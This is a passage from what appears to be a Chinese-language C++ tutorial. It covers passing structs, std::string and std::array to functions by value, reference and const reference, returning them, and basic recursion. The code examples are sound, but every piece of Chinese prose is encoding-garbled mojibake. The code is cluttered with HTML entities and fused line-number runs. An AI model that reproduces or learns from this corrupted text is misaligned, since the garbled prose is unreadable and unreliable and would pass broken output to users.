é€’é€šå¸¸æ¯”æŒ‰æŒ‡é’ˆä¼ é€’æ›´ç®€æ´ã€æ›´å®‰å…¨ï¼ˆå› ä¸ºå®ƒé€šå¸¸ä¸æ¶‰åŠç©ºå¼•ç”¨çš„æ¦‚å¿µï¼‰ã€‚ 123456789101112131415161718192021222324// ç¤ºä¾‹ï¼šæŒ‰å¼•ç”¨ä¼ é€’ (å°†åœ¨ç¬¬ 8 ç« è¯¦ç»†è®²è§£)#include &lt;iostream&gt;struct Circle &#123; double radius; &#125;;// å‚æ•°æ˜¯ Circle çš„å¼•ç”¨ (åˆ«å)double circle_area_ref(const Circle&amp; c) &#123; // ä½¿ç”¨ const å¼•ç”¨é¿å…å¤åˆ¶ä¸”ä¸ä¿®æ”¹ return 3.14159 * c.radius * c.radius;&#125;void scale_circle_ref(Circle&amp; c, double factor) &#123; // ä½¿ç”¨é const å¼•ç”¨å…è®¸ä¿®æ”¹ if (factor &gt; 0) &#123; c.radius *= factor; // ç›´æ¥ç”¨ . è®¿é—®æˆå‘˜ï¼Œä¿®æ”¹åŸå§‹å¯¹è±¡ &#125;&#125;int main() &#123; Circle circ = &#123;5.0&#125;; std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; circle_area_ref(circ) &lt;&lt; std::endl; scale_circle_ref(circ, 3.0); std::cout &lt;&lt; &quot;New Radius: &quot; &lt;&lt; circ.radius &lt;&lt; std::endl; // è¾“å‡º: 15 std::cout &lt;&lt; &quot;New Area: &quot; &lt;&lt; circle_area_ref(circ) &lt;&lt; std::endl; return 0;&#125; æ€»ç»“: ç»“æ„é»˜è®¤æŒ‰å€¼ä¼ é€’ç»™å‡½æ•°ï¼ˆåˆ›å»ºå‰¯æœ¬ï¼‰ã€‚ å‡½æ•°å¯ä»¥æŒ‰å€¼è¿”å›ç»“æ„ï¼ˆè¿”å›å‰¯æœ¬ï¼‰ã€‚ ä¸ºæé«˜æ•ˆç‡æˆ–å…è®¸ä¿®æ”¹åŸå§‹ç»“æ„ï¼Œå¯ä»¥ä¼ é€’ç»“æ„çš„åœ°å€ï¼ˆæŒ‡é’ˆ struct_type*ï¼‰ï¼Œä½¿ç”¨ -&gt; è®¿é—®æˆå‘˜ã€‚ ä½¿ç”¨ const é…åˆæŒ‡é’ˆï¼ˆæˆ–å¼•ç”¨ï¼‰å¯ä»¥é˜²æ­¢å‡½æ•°æ„å¤–ä¿®æ”¹ç»“æ„ã€‚ æŒ‰å¼•ç”¨ä¼ é€’ (struct_type&amp;) æ˜¯å¦ä¸€ç§å¸¸ç”¨çš„é«˜æ•ˆä¼ é€’æ–¹å¼ï¼Œé€šå¸¸æ›´å—æ¬¢è¿ã€‚ 7.7 å‡½æ•°å’Œ string å¯¹è±¡C++ æ ‡å‡†åº“æä¾›çš„ std::string ç±»æ˜¯å¤„ç†å­—ç¬¦ä¸²çš„ç°ä»£ã€æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ–¹å¼ï¼Œå®ƒä¸ C-é£æ ¼å­—ç¬¦ä¸²ï¼ˆå­—ç¬¦æ•°ç»„ï¼‰æœ‰å¾ˆå¤§ä¸åŒã€‚å°† std::string å¯¹è±¡ä¼ é€’ç»™å‡½æ•°æˆ–ä»å‡½æ•°è¿”å›å®ƒä»¬ï¼Œå…¶è¡Œä¸ºæ›´åƒç»“æ„ä½“ï¼Œä½†ä¹Ÿå—ç›Šäº C++ çš„å¼•ç”¨ç‰¹æ€§ã€‚ ä¼ é€’ std::string å¯¹è±¡ä¸ç»“æ„ç±»ä¼¼ï¼Œstd::string å¯¹è±¡é»˜è®¤ä¹Ÿæ˜¯æŒ‰å€¼ä¼ é€’ (Pass by Value)**ã€‚è¿™æ„å‘³ç€å½“å°†ä¸€ä¸ª string å¯¹è±¡ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºè¯¥å¯¹è±¡çš„ä¸€ä¸ªå‰¯æœ¬**ã€‚ ç¤ºä¾‹ï¼šæŒ‰å€¼ä¼ é€’ std::string 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;string&gt; // åŒ…å« string å¤´æ–‡ä»¶// å‡½æ•°ï¼šæŒ‰å€¼æ¥æ”¶ string å¯¹è±¡void display_string_value(std::string str) &#123; // str æ˜¯ message çš„å‰¯æœ¬ std::cout &lt;&lt; &quot;Inside function (value): \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // ä¿®æ”¹å‰¯æœ¬ï¼Œä¸å½±å“åŸå§‹ string str[0] = &#x27;J&#x27;; std::cout &lt;&lt; &quot;Modified copy inside function: \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; display_string_value(message); std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // åŸå§‹ string æœªæ”¹å˜ return 0;&#125; è¾“å‡º: 1234Before call: &quot;Hello&quot;Inside function (value): &quot;Hello&quot;Modified copy inside function: &quot;Jello&quot;After call: &quot;Hello&quot; æŒ‰å€¼ä¼ é€’ std::string çš„é—®é¢˜: è™½ç„¶æŒ‰å€¼ä¼ é€’å¯ä»¥ä¿æŠ¤åŸå§‹æ•°æ®ï¼Œä½† std::string å¯¹è±¡å¯èƒ½å­˜å‚¨å¾ˆé•¿çš„å­—ç¬¦ä¸²ã€‚æ¯æ¬¡è°ƒç”¨å‡½æ•°éƒ½å¤åˆ¶æ•´ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒ…æ‹¬å…¶å†…éƒ¨å¯èƒ½åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼‰å¯èƒ½ä¼šå¯¼è‡´æ˜¾è‘—çš„æ€§èƒ½å¼€é”€ã€‚ æŒ‰å¼•ç”¨ä¼ é€’ std::stringä¸ºäº†é¿å…å¤åˆ¶å¼€é”€å¹¶å…è®¸å‡½æ•°ä¿®æ”¹åŸå§‹ string å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨**æŒ‰å¼•ç”¨ä¼ é€’ (Pass by Reference)**ã€‚ ç¤ºä¾‹ï¼šæŒ‰å¼•ç”¨ä¼ é€’ std::string 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;string&gt;// å‡½æ•°ï¼šæŒ‰å¼•ç”¨æ¥æ”¶ string å¯¹è±¡void modify_string_ref(std::string&amp; str_ref) &#123; // str_ref æ˜¯ message çš„åˆ«å std::cout &lt;&lt; &quot;Inside function (reference): \\&quot;&quot; &lt;&lt; str_ref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // ä¿®æ”¹å¼•ç”¨ï¼Œä¼šç›´æ¥ä¿®æ”¹åŸå§‹ string str_ref += &quot; World&quot;; std::cout &lt;&lt; &quot;Modified original via reference: \\&quot;&quot; &lt;&lt; str_ref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; modify_string_ref(message); // ä¼ é€’å¼•ç”¨ std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // åŸå§‹ string å·²è¢«ä¿®æ”¹ return 0;&#125; è¾“å‡º: 1234Before call: &quot;Hello&quot;Inside function (reference): &quot;Hello&quot;Modified original via reference: &quot;Hello World&quot;After call: &quot;Hello World&quot; æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ std::string (æ¨èæ–¹å¼)å¦‚æœå‡½æ•°éœ€è¦è¯»å– string çš„å†…å®¹ä½†ä¸éœ€è¦ä¿®æ”¹å®ƒï¼Œæœ€ä½³å®è·µæ˜¯ä½¿ç”¨**æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ (Pass by Constant Reference)**ã€‚è¿™æä¾›äº†æŒ‰å¼•ç”¨ä¼ é€’çš„æ•ˆç‡ï¼ˆé¿å…å¤åˆ¶ï¼‰ï¼ŒåŒæ—¶å…·æœ‰æŒ‰å€¼ä¼ é€’çš„å®‰å…¨æ€§ï¼ˆé˜²æ­¢å‡½æ•°ä¿®æ”¹åŸå§‹æ•°æ®ï¼‰ã€‚ ç¤ºä¾‹ï¼šæŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ std::string 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;// å‡½æ•°ï¼šæŒ‰å¸¸é‡å¼•ç”¨æ¥æ”¶ string å¯¹è±¡void display_string_const_ref(const std::string&amp; str_cref) &#123; // str_cref æ˜¯ message çš„å¸¸é‡åˆ«å std::cout &lt;&lt; &quot;Inside function (const reference): \\&quot;&quot; &lt;&lt; str_cref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // str_cref[0] = &#x27;J&#x27;; // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡å¸¸é‡å¼•ç”¨ä¿®æ”¹å¯¹è±¡ std::cout &lt;&lt; &quot;String length: &quot; &lt;&lt; str_cref.length() &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello C++&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; display_string_const_ref(message); // ä¼ é€’å¸¸é‡å¼•ç”¨ std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // åŸå§‹ string æœªæ”¹å˜ // ä¹Ÿå¯ä»¥ä¼ é€’å­—ç¬¦ä¸²å­—é¢å€¼ï¼Œå®ƒä»¬ä¼šè‡ªåŠ¨è½¬æ¢ä¸ºä¸´æ—¶çš„ string å¯¹è±¡ display_string_const_ref(&quot;Temporary String&quot;); return 0;&#125; è¾“å‡º: 123456Before call: &quot;Hello C++&quot;Inside function (const reference): &quot;Hello C++&quot;String length: 9After call: &quot;Hello C++&quot;Inside function (const reference): &quot;Temporary String&quot;String length: 16 æ€»ç»“ä¼ é€’æ–¹å¼: æŒ‰å€¼ (std::string str): åˆ›å»ºå‰¯æœ¬ï¼Œå®‰å…¨ä½†å¯èƒ½ä½æ•ˆã€‚ æŒ‰å¼•ç”¨ (std::string&amp; str): ä¸åˆ›å»ºå‰¯æœ¬ï¼Œé«˜æ•ˆï¼Œå…è®¸ä¿®æ”¹åŸå§‹å¯¹è±¡ã€‚ æŒ‰å¸¸é‡å¼•ç”¨ (const std::string&amp; str): ä¸åˆ›å»ºå‰¯æœ¬ï¼Œé«˜æ•ˆï¼Œä¸å…è®¸ä¿®æ”¹åŸå§‹å¯¹è±¡ã€‚è¿™æ˜¯å°†å­—ç¬¦ä¸²ä¼ é€’ç»™å‡½æ•°è¿›è¡Œåªè¯»è®¿é—®çš„æœ€å¸¸ç”¨å’Œæ¨èçš„æ–¹å¼ã€‚ è¿”å› std::string å¯¹è±¡å‡½æ•°ä¹Ÿå¯ä»¥è¿”å› std::string å¯¹è±¡ã€‚é€šå¸¸ç›´æ¥æŒ‰å€¼è¿”å›å³å¯ã€‚ 1234567891011121314151617#include &lt;iostream&gt;#include &lt;string&gt;// å‡½æ•°ï¼šåˆ›å»ºä¸€ä¸ªé—®å€™è¯­å­—ç¬¦ä¸²å¹¶è¿”å›std::string create_greeting(const std::string&amp; name) &#123; std::string result = &quot;Hello, &quot; + name + &quot;!&quot;; return result; // è¿”å› string å¯¹è±¡&#125;int main() &#123; std::string user_name = &quot;Alice&quot;; std::string greeting = create_greeting(user_name); std::cout &lt;&lt; greeting &lt;&lt; std::endl; // è¾“å‡º: Hello, Alice! return 0;&#125; è™½ç„¶çœ‹èµ·æ¥è¿™é‡Œä¹Ÿæ¶‰åŠå¤åˆ¶ï¼ˆè¿”å› result çš„å‰¯æœ¬ï¼‰ï¼Œä½†ç°ä»£ C++ ç¼–è¯‘å™¨é€šå¸¸ä¼šåº”ç”¨è¿”å›å€¼ä¼˜åŒ– (RVO) æˆ–**å‘½åè¿”å›å€¼ä¼˜åŒ– (NRVO)**ã€‚è¿™äº›ä¼˜åŒ–å¯ä»¥é¿å…åœ¨è¿”å› stringï¼ˆæˆ–å…¶ä»–å¯¹è±¡ï¼‰æ—¶è¿›è¡Œå®é™…çš„å¤åˆ¶ï¼Œä½¿å¾—æŒ‰å€¼è¿”å› std::string éå¸¸é«˜æ•ˆã€‚ ä¸ C-é£æ ¼å­—ç¬¦ä¸²çš„æ¯”è¾ƒ: ä½¿ç”¨ std::string å¯¹è±¡ä¸å‡½æ•°äº¤äº’æ¯”ä½¿ç”¨ C-é£æ ¼å­—ç¬¦ä¸² (char*) ç®€å•å¾—å¤šï¼š ä¸éœ€è¦æ‹…å¿ƒç©ºå­—ç¬¦ \\0ã€‚ ä¸éœ€è¦æ‰‹åŠ¨ç®¡ç†å†…å­˜ï¼ˆnew/delete[]ï¼‰ã€‚ ä¸éœ€è¦å•ç‹¬ä¼ é€’å¤§å°ï¼ˆstring å¯¹è±¡çŸ¥é“è‡ªå·±çš„å¤§å°ï¼‰ã€‚ æŒ‰å¼•ç”¨ï¼ˆå°¤å…¶æ˜¯å¸¸é‡å¼•ç”¨ï¼‰ä¼ é€’é¿å…äº†å¤åˆ¶å¼€é”€ï¼ŒåŒæ—¶ä¿æŒäº†ä»£ç çš„æ¸…æ™°å’Œå®‰å…¨ã€‚ è¿”å›å€¼ä¼˜åŒ–ä½¿å¾—æŒ‰å€¼è¿”å› string é€šå¸¸å¾ˆé«˜æ•ˆã€‚ å› æ­¤ï¼Œåœ¨ç°ä»£ C++ ä¸­ï¼Œå¼ºçƒˆæ¨èä½¿ç”¨ std::string è€Œä¸æ˜¯ C-é£æ ¼å­—ç¬¦ä¸²æ¥å¤„ç†æ–‡æœ¬æ•°æ®ã€‚ 7.8 å‡½æ•°ä¸ array å¯¹è±¡C++11 å¼•å…¥äº† std::array æ¨¡æ¿ç±»ï¼ˆåœ¨ &lt;array&gt; å¤´æ–‡ä»¶ä¸­å®šä¹‰ï¼‰ï¼Œå®ƒæä¾›äº†ä¸€ç§æ›´å®‰å…¨ã€æ›´æ–¹ä¾¿çš„æ–¹å¼æ¥è¡¨ç¤ºå›ºå®šå¤§å°çš„æ•°ç»„ã€‚ä¸ C é£æ ¼æ•°ç»„ä¼šâ€œé€€åŒ–â€æˆæŒ‡é’ˆä¸åŒï¼Œstd::array å¯¹è±¡è¡¨ç°å¾—æ›´åƒæ™®é€šçš„ç±»å¯¹è±¡ï¼ˆç±»ä¼¼äºç»“æ„ä½“ï¼‰ã€‚ å…³é”®ç‰¹æ€§: std::array å°è£…äº†ä¸€ä¸ªå›ºå®šå¤§å°çš„ C é£æ ¼æ•°ç»„ã€‚ å…¶å¤§å°æ˜¯ç±»å‹ä¿¡æ¯çš„ä¸€éƒ¨åˆ†ï¼ˆä¾‹å¦‚ std::array&lt;int, 5&gt; å’Œ std::array&lt;int, 10&gt; æ˜¯ä¸åŒçš„ç±»å‹ï¼‰ã€‚ å®ƒæä¾›äº†æˆå‘˜å‡½æ•°ï¼ˆå¦‚ size(), at(), front(), back()ï¼‰å’Œå¯¹è¿­ä»£å™¨çš„æ”¯æŒã€‚ å®ƒä¸ä¼šè‡ªåŠ¨é€€åŒ–ä¸ºæŒ‡é’ˆã€‚ ä¼ é€’ std::array å¯¹è±¡ç”±äº std::array è¡¨ç°å¾—åƒä¸€ä¸ªå¯¹è±¡ï¼Œå®ƒé»˜è®¤æ˜¯æŒ‰å€¼ä¼ é€’ (Pass by Value) ç»™å‡½æ•°çš„ã€‚è¿™æ„å‘³ç€å½“å°†ä¸€ä¸ª array å¯¹è±¡ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œä¼šåˆ›å»ºè¯¥å¯¹è±¡çš„å®Œæ•´å‰¯æœ¬ã€‚ ç¤ºä¾‹ï¼šæŒ‰å€¼ä¼ é€’ std::array 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;array&gt; // åŒ…å« array å¤´æ–‡ä»¶#include &lt;numeric&gt; // ä¸ºäº† std::accumulate// å®šä¹‰ä¸€ä¸ªåŒ…å« 5 ä¸ª double çš„ array ç±»å‹åˆ«åusing FiveDoubles = std::array&lt;double, 5&gt;;// å‡½æ•°ï¼šæŒ‰å€¼æ¥æ”¶ array å¯¹è±¡ï¼Œè®¡ç®—æ€»å’Œ// arr æ˜¯ data çš„å‰¯æœ¬double sum_array_value(FiveDoubles arr) &#123; std::cout &lt;&lt; &quot;Inside function (value): Modifying copy...&quot; &lt;&lt; std::endl; arr[0] = 1000.0; // ä¿®æ”¹å‰¯æœ¬ï¼Œä¸å½±å“åŸå§‹ array double sum = 0.0; for (double x : arr) &#123; sum += x; &#125; // æˆ–è€…ä½¿ç”¨ std::accumulate(arr.begin(), arr.end(), 0.0); return sum;&#125;int main() &#123; FiveDoubles data = &#123;1.1, 2.2, 3.3, 4.4, 5.5&#125;; std::cout &lt;&lt; &quot;Before call, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; double total = sum_array_value(data); std::cout &lt;&lt; &quot;After call, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // åŸå§‹ array æœªæ”¹å˜ std::cout &lt;&lt; &quot;Sum calculated by value: &quot; &lt;&lt; total &lt;&lt; std::endl; return 0;&#125; è¾“å‡º: 1234Before call, data[0] &#x3D; 1.1Inside function (value): Modifying copy...After call, data[0] &#x3D; 1.1Sum calculated by value: 1015.4 æŒ‰å€¼ä¼ é€’ std::array çš„é—®é¢˜: ä¸ std::string å’Œå¤§å‹ç»“æ„ä½“ç±»ä¼¼ï¼Œå¦‚æœ std::array å¾ˆå¤§ï¼ŒæŒ‰å€¼ä¼ é€’ä¼šå¤åˆ¶æ•´ä¸ªæ•°ç»„å†…å®¹ï¼Œå¯¼è‡´æ€§èƒ½å¼€é”€ã€‚ æŒ‰å¼•ç”¨ä¼ é€’ std::arrayä¸ºäº†é¿å…å¤åˆ¶å¼€é”€å¹¶å…è®¸å‡½æ•°ä¿®æ”¹åŸå§‹ array å¯¹è±¡ï¼Œå¯ä»¥ä½¿ç”¨**æŒ‰å¼•ç”¨ä¼ é€’ (Pass by Reference)**ã€‚ ç¤ºä¾‹ï¼šæŒ‰å¼•ç”¨ä¼ é€’ std::array 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;array&gt;using FiveDoubles = std::array&lt;double, 5&gt;;// å‡½æ•°ï¼šæŒ‰å¼•ç”¨æ¥æ”¶ array å¯¹è±¡ï¼Œå¹¶å°†æ‰€æœ‰å…ƒç´ ä¹˜ä»¥å› å­// arr_ref æ˜¯ data çš„åˆ«åvoid scale_array_ref(FiveDoubles&amp; arr_ref, double factor) &#123; std::cout &lt;&lt; &quot;Inside function (reference): Scaling original array...&quot; &lt;&lt; std::endl; for (double&amp; x : arr_ref) &#123; // ä½¿ç”¨å¼•ç”¨è®¿é—®å…ƒç´ ä»¥ä¿®æ”¹å®ƒä»¬ x *= factor; &#125;&#125;int main() &#123; FiveDoubles data = &#123;1.0, 2.0, 3.0, 4.0, 5.0&#125;; std::cout &lt;&lt; &quot;Before call: &quot;; for (double x : data) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; scale_array_ref(data, 10.0); // ä¼ é€’å¼•ç”¨ std::cout &lt;&lt; &quot;After call: &quot;; for (double x : data) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // åŸå§‹ array å·²è¢«ä¿®æ”¹ std::cout &lt;&lt; std::endl; return 0;&#125; è¾“å‡º: 123Before call: 1 2 3 4 5Inside function (reference): Scaling original array...After call: 10 20 30 40 50 æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ std::array (æ¨èæ–¹å¼)å¦‚æœå‡½æ•°åªéœ€è¦è¯»å– array çš„å†…å®¹è€Œä¸éœ€è¦ä¿®æ”¹å®ƒï¼Œæœ€ä½³å®è·µæ˜¯ä½¿ç”¨**æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ (Pass by Constant Reference)**ã€‚è¿™æä¾›äº†æ•ˆç‡ï¼ˆé¿å…å¤åˆ¶ï¼‰å’Œå®‰å…¨æ€§ï¼ˆé˜²æ­¢ä¿®æ”¹ï¼‰ã€‚ ç¤ºä¾‹ï¼šæŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ std::array 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;array&gt;using FiveDoubles = std::array&lt;double, 5&gt;;// å‡½æ•°ï¼šæŒ‰å¸¸é‡å¼•ç”¨æ¥æ”¶ array å¯¹è±¡ï¼Œå¹¶æ‰“å°å®ƒ// arr_cref æ˜¯ data çš„å¸¸é‡åˆ«åvoid print_array_const_ref(const FiveDoubles&amp; arr_cref) &#123; std::cout &lt;&lt; &quot;Inside function (const reference): Array elements are: &quot;; // arr_cref[0] = 0.0; // é”™è¯¯ï¼ä¸èƒ½é€šè¿‡å¸¸é‡å¼•ç”¨ä¿®æ”¹ for (double x : arr_cref) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; &quot;(Size: &quot; &lt;&lt; arr_cref.size() &lt;&lt; &quot;)&quot; &lt;&lt; std::endl;&#125;int main() &#123; FiveDoubles data = &#123;1.1, 2.2, 3.3, 4.4, 5.5&#125;; print_array_const_ref(data); // ä¼ é€’å¸¸é‡å¼•ç”¨ // åŸå§‹ array æœªæ”¹å˜ std::cout &lt;&lt; &quot;Back in main, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; return 0;&#125; è¾“å‡º: 12Inside function (const reference): Array elements are: 1.1 2.2 3.3 4.4 5.5 (Size: 5)Back in main, data[0] &#x3D; 1.1 æ€»ç»“ä¼ é€’æ–¹å¼: æŒ‰å€¼ (std::array&lt;T, N&gt; arr): åˆ›å»ºå‰¯æœ¬ï¼Œå®‰å…¨ä½†å¯èƒ½ä½æ•ˆã€‚ æŒ‰å¼•ç”¨ (std::array&lt;T, N&gt;&amp; arr): ä¸åˆ›å»ºå‰¯æœ¬ï¼Œé«˜æ•ˆï¼Œå…è®¸ä¿®æ”¹ã€‚ æŒ‰å¸¸é‡å¼•ç”¨ (const std::array&lt;T, N&gt;&amp; arr): ä¸åˆ›å»ºå‰¯æœ¬ï¼Œé«˜æ•ˆï¼Œä¸å…è®¸ä¿®æ”¹ã€‚è¿™æ˜¯å°† array ä¼ é€’ç»™å‡½æ•°è¿›è¡Œåªè¯»è®¿é—®çš„æœ€å¸¸ç”¨å’Œæ¨èçš„æ–¹å¼ã€‚ è¿”å› std::array å¯¹è±¡å‡½æ•°ä¹Ÿå¯ä»¥è¿”å› std::array å¯¹è±¡ï¼Œé€šå¸¸æŒ‰å€¼è¿”å›ã€‚ä¸ std::string ç±»ä¼¼ï¼Œç¼–è¯‘å™¨é€šå¸¸ä¼šåº”ç”¨ RVO/NRVO æ¥ä¼˜åŒ–æ‰è¿”å›æ—¶çš„å¤åˆ¶æ“ä½œã€‚ 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;array&gt;#include &lt;cmath&gt; // for std::powusing ThreeInts = std::array&lt;int, 3&gt;;// å‡½æ•°ï¼šåˆ›å»ºä¸€ä¸ªåŒ…å« x, x^2, x^3 çš„ array å¹¶è¿”å›ThreeInts create_powers(int x) &#123; ThreeInts result; result[0] = x; result[1] = static_cast&lt;int&gt;(std::pow(x, 2)); result[2] = static_cast&lt;int&gt;(std::pow(x, 3)); return result; // è¿”å› array å¯¹è±¡ (é€šå¸¸ä¼šè¢«ä¼˜åŒ–)&#125;int main() &#123; ThreeInts powers_of_5 = create_powers(5); std::cout &lt;&lt; &quot;Powers of 5: &quot;; for (int val : powers_of_5) &#123; std::cout &lt;&lt; val &lt;&lt; &quot; &quot;; // è¾“å‡º: 5 25 125 &#125; std::cout &lt;&lt; std::endl; return 0;&#125; ä¸ C é£æ ¼æ•°ç»„çš„æ¯”è¾ƒ: ä½¿ç”¨ std::array ä¸å‡½æ•°äº¤äº’æ¯”ä½¿ç”¨ C é£æ ¼æ•°ç»„æ›´ä¼˜è¶Šï¼š å¤§å°æ˜¯ç±»å‹çš„ä¸€éƒ¨åˆ†: å‡½æ•°ç­¾åæ˜ç¡®æŒ‡å®šäº†æœŸæœ›çš„æ•°ç»„å¤§å°ï¼Œæé«˜äº†ç±»å‹å®‰å…¨ã€‚ä¾‹å¦‚ï¼Œä¸èƒ½å°† std::array&lt;int, 5&gt; ä¼ é€’ç»™æœŸæœ› std::array&lt;int, 10&gt; çš„å‡½æ•°ã€‚ æ— æŒ‡é’ˆé€€åŒ–: std::array ä¸ä¼šé€€åŒ–ä¸ºæŒ‡é’ˆï¼Œé¿å…äº†ç›¸å…³çš„æ··æ·†å’Œé”™è¯¯ã€‚ ä¼ é€’æ–¹å¼æ˜ç¡®: åƒæ™®é€šå¯¹è±¡ä¸€æ ·æŒ‰å€¼ã€æŒ‰å¼•ç”¨æˆ–æŒ‰å¸¸é‡å¼•ç”¨ä¼ é€’ï¼Œè¯­ä¹‰æ¸…æ™°ã€‚ æ¥å£æ›´ä¸°å¯Œ: å¯ä»¥ç›´æ¥åœ¨å‡½æ•°å†…éƒ¨ä½¿ç”¨ size(), at() ç­‰æˆå‘˜å‡½æ•°ã€‚ å› æ­¤ï¼Œåœ¨éœ€è¦å›ºå®šå¤§å°æ•°ç»„çš„åœºæ™¯ä¸‹ï¼Œstd::array é€šå¸¸æ˜¯æ¯” C é£æ ¼æ•°ç»„æ›´å¥½çš„é€‰æ‹©ï¼Œå°¤å…¶æ˜¯åœ¨å‡½æ•°å‚æ•°å’Œè¿”å›å€¼ä¸­ä½¿ç”¨æ—¶ã€‚ 7.9 é€’å½’é€’å½’ (Recursion) æ˜¯ä¸€ç§ç¼–ç¨‹æŠ€å·§ï¼Œå…¶ä¸­å‡½æ•°ç›´æ¥æˆ–é—´æ¥åœ°è°ƒç”¨è‡ªèº«æ¥è§£å†³é—®é¢˜ã€‚é€’å½’å‡½æ•°å°†ä¸€ä¸ªå¤§é—®é¢˜åˆ†è§£ä¸ºä¸€ä¸ªæˆ–å¤šä¸ªä¸åŸé—®é¢˜ç›¸ä¼¼ä½†è§„æ¨¡æ›´å°çš„å­é—®é¢˜ï¼Œç›´åˆ°é—®é¢˜è§„æ¨¡å°åˆ°å¯ä»¥ç›´æ¥è§£å†³ï¼ˆç§°ä¸ºåŸºçº¿æ¡ä»¶æˆ–åŸºæœ¬æƒ…å†µï¼‰ã€‚ é€’å½’å‡½æ•°é€šå¸¸åŒ…å«ä¸¤ä¸ªå…³é”®éƒ¨åˆ†ï¼š åŸºçº¿æ¡ä»¶ (Base Case): ä¸€ä¸ªæˆ–å¤šä¸ªåœæ­¢é€’å½’çš„æ¡ä»¶ã€‚å½“æ»¡è¶³åŸºçº¿æ¡ä»¶æ—¶ï¼Œå‡½æ•°ä¸å†è°ƒç”¨è‡ªèº«ï¼Œè€Œæ˜¯è¿”å›ä¸€ä¸ªç¡®å®šçš„å€¼æˆ–æ‰§è¡Œä¸€ä¸ªç®€å•çš„æ“ä½œã€‚æ²¡æœ‰åŸºçº¿æ¡ä»¶ä¼šå¯¼è‡´æ— é™é€’å½’ï¼Œæœ€ç»ˆè€—å°½å†…å­˜ï¼ˆæ ˆæº¢å‡ºï¼‰ã€‚ é€’å½’æ­¥éª¤ (Recursive Step): å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œä½†é€šå¸¸ä½¿ç”¨ä¿®æ”¹åçš„å‚æ•°ï¼Œä½¿å¾—é—®é¢˜è§„æ¨¡å‘åŸºçº¿æ¡ä»¶é è¿‘ã€‚ 7.9.1 åŒ…å«ä¸€ä¸ªé€’å½’è°ƒç”¨çš„é€’å½’è¿™æ˜¯æœ€ç®€å•çš„é€’å½’å½¢å¼ï¼Œå‡½æ•°åœ¨æ¯æ¬¡æ‰§è¡Œæ—¶æœ€å¤šè°ƒç”¨è‡ªèº«ä¸€æ¬¡ã€‚ ç¤ºä¾‹ï¼šä½¿ç”¨é€’å½’è¿›è¡Œå€’è®¡æ—¶ 123456789101112131415161718#include &lt;iostream&gt;// é€’å½’å‡½æ•°ï¼šä» n å€’æ•°åˆ° 1void countdown(int n) &#123; // åŸºçº¿æ¡ä»¶ï¼šå½“ n å°äºç­‰äº 0 æ—¶ï¼Œåœæ­¢é€’å½’ if (n &lt;= 0) &#123; std::cout &lt;&lt; &quot;Blastoff!&quot; &lt;&lt; std::endl; &#125; else &#123; // é€’å½’æ­¥éª¤ï¼šæ‰“å°å½“å‰æ•°å­—ï¼Œç„¶åè°ƒç”¨è‡ªèº«å¤„ç† n-1 std::cout &lt;&lt; n &lt;&lt; &quot;...&quot; &lt;&lt; std::endl; countdown(n - 1); // å‡½æ•°è°ƒç”¨è‡ªèº«ï¼Œé—®é¢˜è§„æ¨¡å‡å° (n -&gt; n-1) &#125;&#125;int main() &#123; countdown(5); return 0;&#125; è¾“å‡º: 1234565...4...3...2...1...Blastoff! å·¥ä½œåŸç† (è°ƒç”¨æ ˆ): main è°ƒç”¨ countdown(5)ã€‚ countdown(5) æ‰“å° â€œ5â€¦â€ï¼Œç„¶åè°ƒç”¨ countdown(4)ã€‚ countdown(4) æ‰“å° â€œ4â€¦â€ï¼Œç„¶åè°ƒç”¨ countdown(3)ã€‚ 